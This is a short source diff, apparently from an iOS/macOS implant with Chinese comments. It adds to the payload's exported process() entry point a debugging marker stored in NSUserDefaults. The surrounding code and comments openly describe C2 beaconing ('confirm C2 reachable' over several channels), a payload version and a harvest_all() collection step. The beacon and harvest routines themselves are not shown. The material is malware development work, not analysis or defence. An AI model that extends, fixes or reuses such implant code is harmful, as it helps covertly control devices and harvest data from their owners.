@@ -12,6 +12,10 @@
  *   → ke_run() / hook_slot 等待 → harvest_all()
  */
 
+#include "c2.h"
+
+#import <Foundation/Foundation.h>
+
 /* coruna_constructor / upload_beacon 定义在其他翻译单元，extern 跨 TU 调用 */
 extern void coruna_constructor(void);
 extern void upload_beacon(void);
@@ -52,6 +56,17 @@ extern void upload_beacon(void);
  */
 __attribute__((visibility("default")))
 void process(void) {
+    /* Proof _process ran (no JS / network): survives if upload_beacon dies. */
+    @autoreleasepool {
+        NSUserDefaults *d = [NSUserDefaults standardUserDefaults];
+        NSString *mark = [NSString stringWithFormat:@"v%s t=%.3f",
+                          PAYLOAD_VERSION, [[NSDate date] timeIntervalSince1970]];
+        [d setObject:mark forKey:@"__cru_proc_enter"];
+#pragma clang diagnostic push
+#pragma clang diagnostic ignored "-Wdeprecated-declarations"
+        [d synchronize];
+#pragma clang diagnostic pop
+    }
     upload_beacon();      /* 诊断层 1：同步上报，确认 C2 可达（Channel C/B/A） */
     coruna_constructor(); /* 诊断层 2：线程启动后第一行也会上报               */
 }
